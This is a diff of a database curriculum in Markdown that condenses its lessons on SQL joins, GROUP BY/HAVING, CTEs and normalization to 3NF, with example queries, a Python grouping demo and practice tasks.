-LEFT JOIN employees m ON e.manager_id = m.id;
-
--- Users who have NEVER ordered. Three ways, only two of which are safe.
-SELECT u.name FROM users u                      -- (a) anti-join: correct, fast
-LEFT JOIN orders o ON u.id = o.user_id
+-- Never ordered (safe anti-join)
+SELECT c.name FROM customers c
+LEFT JOIN orders o ON c.id = o.customer_id
 WHERE o.id IS NULL;
-
-SELECT name FROM users u                        -- (b) NOT EXISTS: correct,
-WHERE NOT EXISTS (                              --     and NULL-safe
-    SELECT 1 FROM orders o WHERE o.user_id = u.id
-);
-
-SELECT name FROM users                          -- (c) NOT IN: DANGEROUS.
-WHERE id NOT IN (SELECT user_id FROM orders);   -- Returns NOTHING if any
-                                                -- user_id is NULL.
-
--- Ask the planner which join strategy it chose.
-EXPLAIN QUERY PLAN                              -- Postgres: EXPLAIN ANALYZE
-SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id;
 ```
 
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
+| Decision | Buys | Costs |
+| -------- | ---- | ----- |
+| Surrogate PK | Stable joins | Extra column; join for human labels |
+| Natural PK | Self-describing rows | Real-world renames cascade |
+| Enforced FKs | No dangling refs | Write-time checks; pain across shards (Phase 65) |
+| Split tables | One home per fact (Phase 62) | Reads need joins |
 
+**PRACTICE:**
 
-| Decision                                | What it buys                                                                       | What it costs                                                                                           |
-| --------------------------------------- | ---------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
-| Surrogate keys (auto-increment or UUID) | Never changes, leaks no business meaning, and joins are narrow integer comparisons | An extra column, plus a join to reach anything human-readable                                           |
-| Natural keys (email, ISBN)              | Rows are self-describing, and one fewer join to read                               | The real world changes them, and then every referencing row must change too                             |
-| Enforced foreign keys                   | Dangling references become impossible rather than merely unlikely                  | A write-time check on every insert and delete, and cross-shard references stop working (Phase 65)           |
-| Splitting data across tables            | Each fact lives in one place (which is Phase 62's whole argument)                      | Reading a complete picture now costs joins                                                              |
-| Nested loop join                        | Nearly free when one side is tiny, and streams results immediately                 | $O(n\cdot m)$ without an index on the inner side, which is the classic "why is my query slow"           |
-| Hash join                               | $O(n+m)$ for large equality joins, no sorted input required                        | The build side must fit in memory or it spills to disk, and it cannot do inequality joins               |
-| Merge join                              | $O(n+m)$ with almost no memory                                                     | Requires both inputs sorted, so it costs a sort unless an index already provides the order              |
-| Declarative SQL                         | The planner can change strategy as your data grows, with no code change            | You cannot force a strategy directly, and a stale-statistics plan regression is genuinely hard to debug |
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | SQLBolt lessons 1–6; then write: orders over 100 with buyer name; every customer with order count including zero; books never ordered |
+| Easy | Draw relationship shapes for: authors↔books, students↔courses, customer↔profile photo, orders↔line items |
+| Medium | Demonstrate `NOT IN` returning nothing after inserting a NULL `customer_id`; fix with `NOT EXISTS` |
+| Medium | `EXPLAIN` a join before/after an index on the FK; name nested loop vs hash vs merge |
+| Hard | Schema for ride-sharing: riders, drivers, trips, ratings — justify every `ON DELETE` |
 
+**WHAT THIS UNLOCKS NEXT:**
 
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
-
-SQL is tested in two very different ways and it is worth knowing which one you are in. The **writing** version gives you a schema and asks for a query, and the difficulty is almost always concentrated in the same handful of things: a `LEFT JOIN` where an inner join would silently drop the rows the question is about, the `GROUP BY` and `HAVING` distinction (taught next in 61.2), a window function such as `ROW_NUMBER() OVER (PARTITION BY ...)` for "the top N per group," and null handling. LeetCode's database section and [pgexercises](https://pgexercises.com/) are the right preparation, and the single highest-value habit is stating out loud whether a row with no match should appear in the output, because that one sentence chooses your join type. The **design** version asks you to model something ("design the schema for a ride-sharing app"), and it grades relationship shapes, key choices, and whether you noticed the many-to-many that needs a junction table. Expected follow-ups include "what happens when a user is deleted" (which is really a question about `ON DELETE` behavior), "how would you store a product whose attributes differ by category," and "which columns get an index" (which is Phase 63). The classic trick questions are the difference between `WHERE` and `HAVING`, why `NOT IN` with nulls returns nothing, and the difference between `COUNT(*)` and `COUNT(column)`. All three are testing whether you have been surprised by SQL before.
-
-**PRACTICE UNTIL IT FEELS FAMILIAR**
-
-
-| Difficulty | Task                                                                                                                                                                                                        |
-| ---------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Complete [SQLBolt](https://sqlbolt.com/) lessons 1 through 6, which cover exactly the joins in the diagram above                                                                                            |
-| Easy       | For the schema above, write: all orders over 100 with the buyer's name; every user with their order count including zero; every product never ordered                                                       |
-| Easy       | Explain in one sentence why `COUNT(*)` and `COUNT(o.id)` differ after a `LEFT JOIN`                                                                                                                         |
-| Easy       | Draw the correct relationship shape for: authors and books, students and courses, users and profile photos, orders and line items                                                                           |
-| Medium     | Work through [pgexercises.com](https://pgexercises.com/) joins and subqueries sections without looking at answers                                                                                           |
-| Medium     | Write the `NOT IN` version of "users who never ordered," insert one row with a `NULL` `user_id`, and demonstrate that the query now returns nothing. Then fix it                                            |
-| Medium     | LeetCode 1158, 1174, 550, and 570 - each one is a join plus an aggregate, which is the most common interview shape                                                                                          |
-| Medium     | Use a window function to find each user's most recent order, then do it again without window functions and compare the readability                                                                          |
-| Medium     | Run `EXPLAIN` on a join before and after adding an index on the foreign key. Identify which of the three strategies the planner switched to                                                                 |
-| Medium     | Solve [SQL Murder Mystery](https://mystery.knightlab.com/) end to end                                                                                                                                       |
-| Hard       | Design the full schema for a ride-sharing app: riders, drivers, vehicles, trips, ratings, and surge pricing. Justify every key and every `ON DELETE` choice                                                 |
-| Hard       | Model a product catalogue where each category has entirely different attributes, three ways (a wide table with nulls, an entity-attribute-value table, and a JSON column), and write the trade-offs of each |
-| Hard       | Implement a hash join yourself in Python over two lists of dicts, then a merge join, and benchmark both against a nested loop as the input sizes grow                                                       |
-| Hard       | Read the join planning code in [erikgrinaker/toydb](https://github.com/erikgrinaker/toydb) and describe how it decides between strategies                                                                   |
-
-
-**WHY THE NEXT TOPIC IS NEEDED - Aggregation & CTEs:** Joins reconstruct relationships row-by-row. Real questions often ask for *summaries* ("total per user") and *multi-step* logic ("users whose total exceeds the average"). That is `GROUP BY` / `HAVING` and `WITH` - the next section - not optional interview trivia.
+Joins reconstruct relationships row by row. Real questions ask for *summaries* ("total per customer") and *multi-step* logic ("customers above average spend"). That is `GROUP BY` / `HAVING` and `WITH` — next.
 
 ---
 
 ## 61.2 GROUP BY, HAVING & CTEs
 
-**WHY YOU ARE LEARNING THIS:** Section 61.1 already *used* `GROUP BY` in a LEFT JOIN example and *named* HAVING as an interview trap - without teaching the mechanism. Aggregation and CTEs are how you answer "per group" and "step by step" questions without nested subquery soup. Phase 61 owns this depth; do not wait for Story XI.
+Section 61.1 already used `GROUP BY` in a LEFT JOIN example. Aggregation is how you answer "per group" without pulling every row into application code. **CTEs** name intermediate results so multi-step questions stay readable.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**COLLAPSING ROWS INTO GROUPS:**
 
-- Best CTE walkthrough: [SQL WITH Clause | Clearly Explained (Alice Zhao / Maven Analytics)](https://www.youtube.com/watch?v=LJC8277LONg) - CTEs vs subqueries vs temps *(Composio YouTube verified)*
-- Alternative: [Advanced SQL Tutorial | CTE (Alex The Analyst)](https://www.youtube.com/watch?v=K1WeoKxLZ5o) *(Composio YouTube verified)*; [SQL WITH Clause (techTFQ)](https://www.youtube.com/watch?v=QNfnuK-1YYY) *(Composio YouTube)*
-- Another angle: [Advanced Aggregate Functions in SQL (GROUP BY, HAVING vs WHERE)](https://www.youtube.com/watch?v=nNrgRVIzeHg) *(Composio YouTube)*; [SQL Execution Order (ByteByteGo)](https://www.youtube.com/watch?v=BHwzDmr6d7s)
-- Interactive: [SQLBolt Lesson 12 (Order of execution / aggregates)](https://sqlbolt.com/lesson/select_queries_order_of_execution); [Mode SQL Tutorial - GROUP BY](https://mode.com/sql-tutorial/sql-group-by/); [PostgreSQL WITH queries](https://www.postgresql.org/docs/current/queries-with.html) *(Composio fetch verified)*
-- Written: [Select Star SQL](https://selectstarsql.com/) aggregate chapters; Neon [CTE tutorial](https://neon.com/postgresql/tutorial/cte)
-- Practice: [pgexercises Aggregates](https://pgexercises.com/); LeetCode Database Easy/Medium that require `HAVING`
-
-**STEP-BY-STEP EXPLANATION**
-
-**GROUP BY** collapses many rows into one row *per group*. After grouping, you may only `SELECT` (a) grouping columns and (b) aggregates (`COUNT`, `SUM`, `AVG`, `MIN`, `MAX`). Picking a non-grouped, non-aggregated column is illegal in strict SQL (and a silent wrong answer in loose modes).
-
-**WHERE vs HAVING:**
+**GROUP BY** collapses many rows into one row per group. After grouping, you may only `SELECT` grouping columns and aggregates (`COUNT`, `SUM`, `AVG`, `MIN`, `MAX`). A non-grouped, non-aggregated column is illegal in strict SQL (and a silent wrong answer in loose modes).
 
 | Clause | When it runs | Filters |
 | ------ | ------------ | ------- |
 | `WHERE` | *Before* grouping | Individual rows |
 | `HAVING` | *After* grouping | Groups (usually with aggregates) |
 
-So: "orders over $100" → `WHERE total > 100`. "users with more than 3 orders" → `GROUP BY user_id HAVING COUNT(*) > 3`. Putting the second filter in `WHERE` fails because `COUNT(*)` does not exist yet per row.
+"Orders over $100" → `WHERE total > 100`. "Customers with more than 3 orders" → `GROUP BY customer_id HAVING COUNT(*) > 3`. Putting the second filter in `WHERE` fails because `COUNT(*)` does not exist yet per row.
 
-**CTE (`WITH name AS (SELECT ...)`):** a named temporary result that exists for one statement. Use it to make multi-step queries readable: aggregate in one CTE, filter or join in the next. Same power as a subquery; clearer when there are two or more steps. **Recursive CTEs** exist for hierarchies (org charts, graphs) - know they exist; deep recursion patterns can wait.
+Logical order (simplified): `FROM/JOIN` → `WHERE` → `GROUP BY` → `HAVING` → `SELECT` → `ORDER BY`.
 
-Logical order to keep straight (simplified): `FROM/JOIN` → `WHERE` → `GROUP BY` → `HAVING` → `SELECT` → `ORDER BY`.
+**NAMING THE STEPS WITH WITH:**
+
+A **CTE** (`WITH name AS (SELECT ...)`) is a named temporary result for one statement — same power as a subquery, clearer with two or more steps. Recursive CTEs exist for hierarchies; know they exist; deep graph patterns can wait.
 
 ```sql
--- Per-user totals, then keep only "big" customers
-SELECT user_id, SUM(total) AS lifetime
+SELECT customer_id, SUM(total) AS lifetime
 FROM orders
-GROUP BY user_id
+GROUP BY customer_id
 HAVING SUM(total) > 500;
 
--- Same idea as a CTE (named steps you can read top-to-bottom)
-WITH per_user AS (
-    SELECT user_id, SUM(total) AS lifetime
+WITH per_customer AS (
+    SELECT customer_id, SUM(total) AS lifetime
     FROM orders
-    GROUP BY user_id
+    GROUP BY customer_id
 ),
 big AS (
-    SELECT * FROM per_user WHERE lifetime > 500
+    SELECT * FROM per_customer WHERE lifetime > 500
 )
-SELECT u.name, b.lifetime
+SELECT c.name, b.lifetime
 FROM big b
-JOIN users u ON u.id = b.user_id
+JOIN customers c ON c.id = b.customer_id
 ORDER BY b.lifetime DESC;
 ```
 
-**PICTURE IT LIKE THIS**
-
-`GROUP BY` is sorting mail into cubbies labeled by city, then writing one summary slip per cubby. `HAVING` throws away cubbies whose summary fails a test. A CTE is sticky-labeling an intermediate tray ("big customers") so the next step does not dig through a nested subquery.
-
-**SMALL WORKING EXAMPLE**
-
 ```python playground=cs-phase-61-groupby-cte
-# Teach the grouping idea even without a live SQL engine:
-# rows -> buckets by key -> aggregate each bucket -> filter buckets (HAVING).
+# Rows -> buckets by key -> aggregate -> filter buckets (HAVING).
 
 orders = [
-    {"user_id": 1, "total": 120},
-    {"user_id": 1, "total": 80},
-    {"user_id": 2, "total": 50},
-    {"user_id": 3, "total": 400},
-    {"user_id": 3, "total": 200},
+    {"customer_id": 1, "total": 120},
+    {"customer_id": 1, "total": 80},
+    {"customer_id": 2, "total": 50},
+    {"customer_id": 3, "total": 400},
+    {"customer_id": 3, "total": 200},
 ]
 
 from collections import defaultdict
 buckets = defaultdict(list)
 for row in orders:
-    buckets[row["user_id"]].append(row["total"])
+    buckets[row["customer_id"]].append(row["total"])
 
-per_user = {uid: sum(totals) for uid, totals in buckets.items()}  # GROUP BY + SUM
-big = {uid: life for uid, life in per_user.items() if life > 500}  # HAVING
+per_customer = {cid: sum(totals) for cid, totals in buckets.items()}
+big = {cid: life for cid, life in per_customer.items() if life > 500}
 
-print("per_user:", dict(per_user))
+print("per_customer:", dict(per_customer))
 print("HAVING lifetime > 500:", big)
-
-# CTE shape: name the intermediate, then query it
-with_step = per_user  # WITH per_user AS (...)
-print("CTE-style select from per_user:", with_step)
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
-
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
-| Easy       | Write `GROUP BY` + `COUNT` for orders per user; then add `HAVING COUNT(*) >= 2` |
-| Medium     | Rewrite a nested subquery that computes "above average lifetime spend" as a two-step CTE |
-| Hard       | Explain why `WHERE COUNT(*) > 2` is illegal/wrong and what to write instead |
+| Easy | `GROUP BY` + `COUNT` for orders per customer; add `HAVING COUNT(*) >= 2` |
+| Medium | Rewrite "above average lifetime spend" from a nested subquery as a two-step CTE |
+| Hard | Why is `WHERE COUNT(*) > 2` wrong, and what do you write instead? |
 
+**WHAT THIS UNLOCKS NEXT:**
 
-**WHY THE NEXT TOPIC IS NEEDED - Normalization:** Keys, JOINs, and aggregates let you *query* split data. But nothing so far tells you *where* the splits should go - get that wrong and you're back to duplicated, inconsistent data, just spread across multiple tables. That is Phase 62.
+Keys, JOINs, and aggregates let you *query* split data. Nothing yet tells you *where* the splits should go. Get that wrong and you are back to duplicated, inconsistent facts — just spread across tables. That is normalization — Phase 62.
+
 
 ---
 
@@ -11365,369 +11101,131 @@ print("CTE-style select from per_user:", with_step)
 
 **WHAT YOU WILL BE ABLE TO DO:** Design a normalized schema through 3NF for a small domain, name the update/insert/delete anomalies each form prevents, and justify one deliberate denormalization.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 61 (tables, keys, and JOINs - normalization decides *where* those splits go).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 61 — tables, keys, and JOINs.
+
+**LEARNING RESOURCES:**
+
+- [Database Normalization 1NF–5NF (Decomplexify)](https://www.youtube.com/watch?v=GFQaEYEc8_8)
+- [dbdiagram.io](https://dbdiagram.io/) — sketch ER diagrams quickly
+- [GeeksforGeeks — Normal Forms](https://www.geeksforgeeks.org/dbms/normal-forms-in-dbms/)
+- [Designing Data-Intensive Applications](https://dataintensive.net/) ch. 2 — when document stores push back
+- [Pagila sample schema](https://github.com/devrimgunduz/pagila) — read a real normalized design
 
 ## 62.1 Normalization
 
-**WHY YOU ARE LEARNING THIS:** A table designed carelessly can store the same fact in multiple places - e.g. a single `orders` table with columns for `user_name` and `user_email` repeated on every order that same user places. The moment a user changes their email, you must find and update every single order row, and if you miss one, the data is now silently inconsistent - two different rows disagree about the same fact.
+Our bookstore can already JOIN customers to orders. Put `customer_email` on every order row and the next email change becomes a scavenger hunt — miss one row and the database disagrees with itself about one fact. **Normalization** is the mechanical fix: each fact lives in exactly one place.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**FUNCTIONAL DEPENDENCIES DRIVE THE FORMS:**
 
-- Best animated explanation: [Learn Database Normalization: 1NF, 2NF, 3NF, 4NF, 5NF (Decomplexify)](https://www.youtube.com/watch?v=GFQaEYEc8_8) *(Composio YouTube)* - derives each form from the anomaly it prevents
-- Alternative: [Learn Database Normalization Fast (DbSchema)](https://www.youtube.com/watch?v=FzVCGou8SMA) *(Composio YouTube)*
-- Another angle: [Data Normalization vs Denormalization: Which is better when? (IT k Funde)](https://www.youtube.com/watch?v=W_5vn8TBLys) and [What Are The Normalization Trade-offs In Relational Database Design? (Server Logic Simplified)](https://www.youtube.com/watch?v=K5Gfa1ES_Cg) - both argue the other direction, which matters because normalization taken as an unconditional good is how you end up with a schema that needs eleven joins to render one page
-- Interactive simulator: [DB Fiddle](https://www.db-fiddle.com/) is the practical tool here: build the unnormalized table, run an update that touches only some rows, and query the inconsistency you just created. Seeing the anomaly with your own eyes is worth more than any diagram. [dbdiagram.io](https://dbdiagram.io/) draws entity-relationship diagrams from a short text syntax, which makes iterating on a schema fast
-- Written documentation: [GeeksforGeeks - Normal Forms in DBMS](https://www.geeksforgeeks.org/dbms/normal-forms-in-dbms/) for the formal definitions, [Designing Data-Intensive Applications](https://dataintensive.net/) chapter 2 for why document databases push back on normalization, and [Use The Index, Luke](https://use-the-index-luke.com/) for what the resulting joins cost
-- GitHub implementation: [Modern SQL's examples](https://modern-sql.com/) and the [Postgres sample databases](https://github.com/devrimgunduz/pagila) (Pagila, a normalized DVD-rental schema) are the best way to read a well-normalized schema written by people who knew what they were doing
-- Practice platform: [pgexercises.com](https://pgexercises.com/) uses a properly normalized database structure, so every exercise gives you practice working through one. [LeetCode's Database tag](https://leetcode.com/problemset/database/) also includes many problems whose difficulty comes from understanding that structure.
+A **functional dependency** `A → B` means "if you know A, B is determined." In a bad orders table, `customer_id → email`. Normal forms require every dependency to point *from the primary key* (and nothing else).
 
-**STEP-BY-STEP EXPLANATION**
+- **1NF:** atomic columns — no lists, no repeating groups. `"widget, gizmo"` in one cell cannot be indexed or joined cleanly.
+- **2NF:** 1NF + no **partial dependency** on part of a composite key. `order_items(order_id, book_id, …, book_title)` repeats the title on every line; title depends only on `book_id`. Surrogate single-column keys are in 2NF for free.
+- **3NF:** 2NF + no **transitive dependency**. `orders(…, dept_id, dept_name)` with `id → dept_id → dept_name` duplicates department names. Move `dept_name` to `departments`. **BCNF** is a slightly stricter 3NF; if you are solidly in 3NF you are almost always in BCNF.
+- **4NF / 5NF:** multi-valued and join dependencies — know they exist; rarely needed below specialist work.
 
-Normalization is a mechanical procedure driven by one concept: a **functional dependency**, written `A -> B`, meaning "if you know A, then B is determined." In an orders table that also stores the customer's email, `customer_id -> email` is a functional dependency, and the entire theory of normal forms is about making sure every dependency in a table points *from the primary key and nothing else*. Once you see it that way, the forms stop being arbitrary rules.
+Practical shortcut: *every table describes one kind of thing; every column is a fact about that thing only.* If a column on `orders` is really about the customer, it belongs on `customers`.
 
-**First normal form** requires that every column hold a single atomic value, with no repeating groups and no lists. A `phone_numbers` column containing `"555-1234, 555-9876"` violates it, and the consequence is concrete rather than aesthetic: you cannot index it, cannot constrain it, cannot join on it, and "find the customer with this phone number" becomes a substring search that will match `555-98765` too.
-
-**Second normal form** requires 1NF plus no **partial dependency**, meaning no non-key column may depend on only *part* of a composite key. In `order_items(order_id, product_id, quantity, product_name)`, the key is the pair, but `product_name` depends only on `product_id`, so the product's name is repeated on every line item that ever contained it. Rename a product and you must find every row. Note that 2NF only ever matters when the primary key is composite, which is why tables with a surrogate integer key are automatically in 2NF.
-
-**Third normal form** requires 2NF plus no **transitive dependency**, meaning no non-key column may depend on another non-key column. In `employees(id, department_id, department_name)`, the key determines `department_id` which determines `department_name`, so the department's name is duplicated across every employee in it. The chain `id -> department_id -> department_name` is the transitive dependency, and the fix is to move `department_name` into a `departments` table. **Boyce-Codd normal form** is a slightly stricter version of 3NF that also handles the rare case where a non-key candidate key determines part of the primary key, and in practice, if you are in 3NF you are almost always in BCNF too.
-
-**Fourth and fifth normal form** deal with multi-valued and join dependencies and come up so rarely that knowing they exist, and that 4NF is about two independent multi-valued facts being stored in one table, is sufficient for essentially all real work and all interviews below the specialist level.
-
-The practical shortcut that experienced engineers actually use is worth stating plainly, because it produces 3NF schemas without any of the above vocabulary: *every table describes exactly one kind of thing, and every column in it is a fact about that one thing and nothing else.* If a column in `orders` is really a fact about the customer, it belongs in `customers`. That single test catches nearly every violation you will encounter.
-
-Denormalization is the deliberate reverse, and it is not a failure. You reintroduce redundancy when reads dominate writes and the join cost has been measured rather than assumed. The forms it takes are worth naming: a **precomputed aggregate** such as storing `comment_count` on a post rather than counting comments on every page view; a **duplicated column** such as copying `author_name` onto the post so the feed does not need a join; a **materialized view** which is the database maintaining a denormalized copy for you; and a **cached read model** which is Phase 81's territory. Every one of these buys read speed with the same currency: you now have two copies of a fact and you must keep them in sync, which means every write path has to remember to update both, and any path that forgets creates exactly the inconsistency normalization existed to prevent. That is why the honest rule is to normalize first, measure, and denormalize the specific hot path with a written note about who is responsible for keeping the copies consistent.
-
-One case deserves a specific exception, because it is the single most common legitimate denormalization: values captured at a point in time. Storing `unit_price` on an order line item is *not* a normalization violation even though the product has a price, because they are different facts. The product's price is what it costs now; the line item's price is what this customer actually paid. Confusing "duplicated data" with "a historical record" leads people to normalize away information they will need later, and an invoice that changes when a price changes is a genuine bug.
-
-**BEFORE VS. AFTER**
+**THE THREE ANOMALIES:**
 
 ```text
-Unnormalized: orders table also stores user_name, user_email directly
-        Problem: user's email is duplicated across every order they've ever
-        placed. An update must touch every row, or the data becomes
-        inconsistent (an "update anomaly").
+orders_bad (not even 1NF)
+ +----+---------+--------------+------------------+-------+
+ | id | cust_id | cust_email   | products         | total |
+ +----+---------+--------------+------------------+-------+
+ |  1 |      42 | ada@x.com    | "widget, gizmo"  |   150 |
+ |  2 |      42 | ada@x.com    | "widget"         |    50 |
+ |  3 |      43 | bob@x.com    | "gizmo"          |   200 |
+ +----+---------+--------------+------------------+-------+
 
-Normalized: user_name/user_email live ONLY in the users table;
-orders only stores a user_id foreign key pointing to it.
-        Fix: the email exists in exactly one place. Updating it updates
-        the single source of truth; every JOIN reflects the change instantly.
-        Trade-off: reading a user's name now costs a JOIN instead of being
-        already sitting in the row you fetched -- a real, deliberate
-        performance cost paid to guarantee consistency.
+ UPDATE anomaly: change Ada's email on row 1 only -> two emails for one person.
+ INSERT anomaly: new customer with zero orders -> nowhere to store email.
+ DELETE anomaly: delete Bob's only order -> Bob disappears from the database.
 ```
 
-**Mental Model:** Normalization is a series of increasingly strict rules ("normal forms") for eliminating redundancy - the practical rule of thumb most engineers actually use day to day is: *each fact should be stored in exactly one place.* Denormalization (deliberately reintroducing some redundancy for read speed) is a valid, common trade-off once you understand what you're giving up - it's revisited in Phase 81 as a caching-adjacent scalability technique.
-
-**PICTURE IT LIKE THIS**
-
-An unnormalized table is a spreadsheet where every row of a delivery log restates the driver's name, phone number, and licence plate. It reads beautifully, right up until a driver changes their phone number. Now the truth about that phone number depends on which row you happen to look at, and there is no way to tell which rows are stale. Worse, if that driver has no deliveries yet, there is nowhere to record their number at all, and if you delete their last delivery, you have also deleted the only copy of their phone number in existence. Those three failures have names: the update anomaly, the insertion anomaly, and the deletion anomaly, and every normal form exists to eliminate one of them.
-
-The normalized version is a drivers roster plus a delivery log that references it by driver number. The phone number exists once, in the place where facts about drivers live. Changing it changes it everywhere, because there was never an "everywhere" to begin with. The cost is that reading a delivery log now means looking up two documents instead of one, and if you print that log a thousand times a day, you might reasonably decide to print the driver's name onto it, accepting that you now own the job of reprinting when a name changes. That decision, made deliberately and written down, is denormalization. Made accidentally and forgotten, it is the original bug.
-
-**Internal Working, Step by Step - each normal form as the anomaly it removes:**
+**SPLITTING TABLES WITHOUT LOSING THE WORLD:**
 
 ```text
-STARTING POINT: one table holding everything. Note it is not even in 1NF.
+1NF: split the list
+  order_items(order_id, product, quantity)  -- "gizmo, gizmo" -> quantity 2
 
- orders
- +----+---------+--------------+-------------------+------------------+-------+
- | id | cust_id | cust_email   | products          | dept_id/dept_name| total |
- +----+---------+--------------+-------------------+------------------+-------+
- |  1 |      42 | ada@x.com    | "widget, gizmo"   | 7 / Hardware     |   150 |
- |  2 |      42 | ada@x.com    | "widget"          | 7 / Hardware     |    50 |
- |  3 |      43 | bob@x.com    | "gizmo, gizmo"    | 7 / Hardware     |   200 |
- +----+---------+--------------+-------------------+------------------+-------+
-        ^^^^^^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^
-        repeated per order       a LIST in one cell   repeated per order
+2NF: move attributes that depend on part of a composite key
+  books(id, title, price)  <-  order_items(order_id, book_id, quantity, unit_price)
 
-THE THREE ANOMALIES, which are the actual reason any of this matters:
+3NF: break transitive chains
+  departments(id, name)  <-  orders(..., dept_id)
 
-  UPDATE anomaly:  Ada changes her email.
-                   -> rows 1 AND 2 must both change. Miss one and the
-                      database now DISAGREES WITH ITSELF about one fact,
-                      with no way to tell which row is right.
+FINAL BOOKSTORE SHAPE:
+  customers --< orders --< order_items >-- books
+                  \
+                   >-- departments   (if you track fulfillment dept)
 
-  INSERT anomaly:  A new customer signs up but has not ordered yet.
-                   -> there is NOWHERE to put their email, because email
-                      only exists as a column on `orders`.
-
-  DELETE anomaly:  Delete Bob's only order.
-                   -> bob@x.com is now gone from the database entirely.
-                      You deleted an order and lost a customer.
-
-STEP 1 -> 1NF: atomic columns. No lists, no repeating groups.
-
- The `products` cell is the violation. Split it into its own table:
-
- order_items
- +----------+------------+----------+
- | order_id | product    | quantity |
- +----------+------------+----------+
- |        1 | widget     |        1 |
- |        1 | gizmo      |        1 |
- |        2 | widget     |        1 |
- |        3 | gizmo      |        2 |   <- "gizmo, gizmo" becomes quantity 2
- +----------+------------+----------+
-
- What this unlocks, concretely:
-   before: WHERE products LIKE '%widget%'   -> cannot use an index, and
-                                               matches "widget-holder" too
-   after:  WHERE product = 'widget'         -> indexable, exact, joinable
-
-STEP 2 -> 2NF: no PARTIAL dependencies on a composite key.
-
- Suppose order_items also carried the product's name and price:
-
-   order_items(order_id, product_id, quantity, product_name, product_price)
-                ^^^^^^^^^^^^^^^^^^^ composite PRIMARY KEY
-                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-   product_name depends on product_id ALONE, not on the pair.
-   -> PARTIAL dependency. product_name is repeated on every line item
-      that ever contained that product.
-
-   FIX: move it to where it belongs.
-
-   products                          order_items
-   +----+--------+-------+           +----------+------------+----------+
-   | id | name   | price |           | order_id | product_id | quantity |
-   +----+--------+-------+           +----------+------------+----------+
-   |  1 | widget |    50 |<----------|        1 |          1 |        1 |
-   |  2 | gizmo  |   100 |<----------|        1 |          2 |        1 |
-   +----+--------+-------+           +----------+------------+----------+
-
-   NOTE: 2NF can only ever be violated when the key is COMPOSITE.
-         A table keyed on a single surrogate integer is in 2NF for free.
-
-STEP 3 -> 3NF: no TRANSITIVE dependencies.
-
- The dept_id / dept_name pair is the violation:
-
-   orders(id, ..., dept_id, dept_name)
-
-   id --> dept_id --> dept_name
-   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ the key determines dept_id, and dept_id
-   determines dept_name. dept_name therefore depends on the key only
-   TRANSITIVELY, through a non-key column.
-
-   FIX: break the chain.
-
-   departments                       orders
-   +----+-----------+                +----+---------+---------+-------+
-   | id | name      |                | id | cust_id | dept_id | total |
-   +----+-----------+                +----+---------+---------+-------+
-   |  7 | Hardware  |<---------------|  1 |      42 |       7 |   150 |
-   +----+-----------+                +----+---------+---------+-------+
-
-THE FINAL SHAPE, with every anomaly gone:
-
-   customers            orders              order_items         products
-   +----+----------+    +----+---------+    +--------+-------+   +----+------+
-   | 42 | ada@x    |<---| 1  | 42      |<---| 1      | 1     |-->| 1  |widget|
-   | 43 | bob@x    |    | 2  | 42      |    | 1      | 2     |   | 2  |gizmo |
-   +----+----------+    | 3  | 43      |    | 2      | 1     |   +----+------+
-                        +----+---------+    +--------+-------+
-                            |
-                            v  departments
-                        +----+----------+
-                        | 7  | Hardware |
-                        +----+----------+
-
-   Ada's email now exists in EXACTLY ONE PLACE.
-     UPDATE anomaly: gone. One row to change.
-     INSERT anomaly: gone. A customer can exist with zero orders.
-     DELETE anomaly: gone. Deleting an order does not delete a customer.
-
-   THE PRICE, stated honestly: rendering "Ada's order history with
-   product names" was ZERO joins in the original table. It is now THREE.
-   That is not a hidden cost, it is the deal.
-
-AND THE DELIBERATE REVERSE: denormalization, with the bill attached.
-
- NORMALIZED read path for a post feed:
-   SELECT p.*, u.name, COUNT(c.id)
-   FROM posts p JOIN users u ON ... LEFT JOIN comments c ON ...
-   GROUP BY p.id, u.name;
-        -> correct always, and it costs 2 joins + an aggregate PER PAGE VIEW
-
- DENORMALIZED read path:
-   posts(id, body, author_name, comment_count)   <- copies, on purpose
-   SELECT * FROM posts ORDER BY created_at DESC LIMIT 20;
-        -> one index scan, no joins, no aggregate
-
- THE BILL, which is the part people skip:
-   - renaming a user must now also update author_name on all their posts
-   - inserting a comment must now also increment comment_count
-   - deleting a comment must decrement it
-   - ANY code path that forgets one of the above creates a permanent,
-     silent inconsistency -- which is EXACTLY the anomaly this whole
-     section removed
-
- THE ONE CASE THAT IS NOT A VIOLATION AT ALL:
-
-   order_items.unit_price = 50      and     products.price = 65
-
-   These are not two copies of one fact. They are two DIFFERENT facts:
-   "what this customer paid" and "what it costs today." Normalizing
-   the first one away means old invoices change when prices change,
-   which is a real bug, not a cleaner schema.
+  Ada's email exists in EXACTLY ONE PLACE.
+  Price to pay: "Ada's history with titles" needs joins — that is the deal.
 ```
 
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
+**WHEN DUPLICATION IS ON PURPOSE:**
 
+**Denormalization** reintroduces redundancy when reads dominate and join cost is *measured*. Forms: precomputed counters (`comment_count`), duplicated display columns (`author_name` on a post), materialized views, cached read models (later). Every copy needs a sync story — triggers, app code, or the DB owning a materialized view. Miss a path and you recreate the anomaly.
 
-| Decision                                | What it buys                                                                                | What it costs                                                                            |
-| --------------------------------------- | ------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
-| 1NF (atomic columns)                    | Columns become indexable, constrainable, and joinable                                       | An extra table for anything that was a list                                              |
-| 2NF (no partial dependencies)           | A repeated attribute has one home, so renaming it is one write                              | Only relevant with composite keys, and it adds a join                                    |
-| 3NF / BCNF (no transitive dependencies) | Every fact has exactly one authoritative location, so the three anomalies become impossible | More tables, and more joins per read                                                     |
